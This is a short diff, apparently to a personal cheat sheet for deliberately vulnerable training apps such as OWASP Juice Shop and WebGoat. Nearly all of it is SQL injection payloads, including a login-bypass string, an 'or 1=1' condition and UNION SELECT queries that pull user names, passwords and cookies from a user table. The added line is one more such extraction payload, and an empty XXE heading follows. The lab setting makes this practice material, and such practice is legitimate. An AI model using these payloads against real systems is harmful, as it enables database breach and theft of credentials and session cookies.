@@ -11,6 +11,7 @@ bender@juice-sh.op' --
 101 or 1=1
 
 Smith' union select userid,user_name, password,cookie,cookie, cookie,userid from user_system_data --
+Smith' union select all 1, '2' ,user_name,password, 'MC', cookie, 2 from user_system_data --
 
 ## XXE ##
 
